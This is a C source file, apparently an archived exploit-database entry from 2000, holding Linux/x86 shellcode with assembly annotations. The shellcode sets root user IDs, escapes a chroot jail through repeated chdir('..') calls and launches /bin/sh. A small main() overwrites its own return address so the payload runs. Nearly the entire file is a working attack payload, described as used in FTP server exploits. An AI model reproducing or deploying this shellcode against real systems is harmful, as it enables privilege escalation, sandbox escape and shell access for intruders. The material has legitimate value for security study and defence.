/*
 *  Linux/x86
 *
 *  - setreuid(0, 0);
 *  - chroot-break (make a temp dir with mkdir(), chroot() to tempdir,
 *    go through a loop of chdir(".."); then a final chroot(".");
 *  - execve of /bin/sh
 *
 *  (used in several wu-ftpd, beroftpd and proftpd exploits, amongst others)
 */

#include <stdio.h>
char c0de[] =
/* main: */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x29\xdb"                                  /* subl %ebx, %ebx             */
"\x29\xc9"                                  /* subl %ecx, %ecx             */
"\xb0\x46"                                  /* movb $0x46, %al             */
"\xcd\x80"                                  /* int $0x80                   */

"\xeb\x60"                                  /* jmp callz                   */

/* start: */
"\x5e"                                      /* popl %esi                   */
"\x8d\x5e\x0f"                              /* leal 0x0f(%esi), %ebx       */

/* loopz: */
"\x39\xf3\x7c"                              /* cmpl %esi, %ebx             */
"\x06\x80"                                  /* jl after                    */
"\x03\x04"                                  /* addb $0x04, (%ebx)          */
"\x4b"                                      /* decl %ebx                   */
"\xeb\xf6"                                  /* jmp loopz                   */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x88\x46\x01"                              /* movb %al, 0x01(%esi)        */
"\x88\x46\x08"                              /* movb %al, 0x08(%esi)        */
"\x88\x46\x10"                              /* movb %al, 0x10(%esi)        */
"\x8d\x5e\x07"                              /* leal 0x07(%esi), %ebx       */
"\xb0\x0c"                                  /* movb $0x0c, %al             */
"\xcd\x80"                                  /* int $0x80                   */
"\x8d\x1e"                                  /* leal (%esi), %ebx           */
"\x29\xc9"                                  /* subl %ecx, %ecx             */
"\xb0\x27"                                  /* movb $0x27, %al             */
"\xcd\x80"                                  /* int $0x80                   */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\xb0\x3d"                                  /* movb $0x3d, %al             */
"\xcd\x80"                                  /* int $0x80                   */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x8d\x5e\x02"                              /* leal 0x02(%esi), %ebx       */
"\xb0\x0c"                                  /* movb $0x0c, %al             */
"\xcd\x80"                                  /* int $0x80                   */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x88\x46\x03"                              /* movb %al, 0x03(%esi)        */
"\x8d\x5e\x02"                              /* leal 0x02(%esi), %ebx       */
"\xb0\x3d"                                  /* movb $0x3d, %al             */
"\xcd\x80"                                  /* int $0x80                   */
"\x8d\x5e\x09"                              /* leal 0x09(%esi), %ebx       */
"\x89\x5b\x08"                              /* movl %ebx, 0x08(%ebx)       */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x88\x43\x07"                              /* movb %al, 0x07(%ebx)        */
"\x89\x43\x0c"                              /* movl %eax, 0x0c(%ebx)       */
"\xb0\x0b"                                  /* movb $0x0b, %al             */
"\x8d\x4b\x08"                              /* leal 0x08(%ebx), %ecx       */
"\x8d\x53\x0c"                              /* leal 0x0c(%ebx), %edx       */
"\xcd\x80"                                  /* int $0x80                   */
"\x29\xc0"                                  /* subl %eax, %eax             */
"\x40"                                      /* incl %eax                   */
"\xcd\x80"                                  /* int $0x80                   */
"\xe8\x9b\xff\xff\xff"                      /* call start                  */
"\xff\xff\xff"                              /* markup                      */

"\x3d\x3d\x2a\x2a\x2b\x2a\x2a\x2b\x3d\x2b\x5e\x65\x6a\x2b\x6f\x64";

main() {
        int *ret;
        ret=(int *)&ret +2;
        printf("Shellcode lenght=%d\n",strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2000-08-07]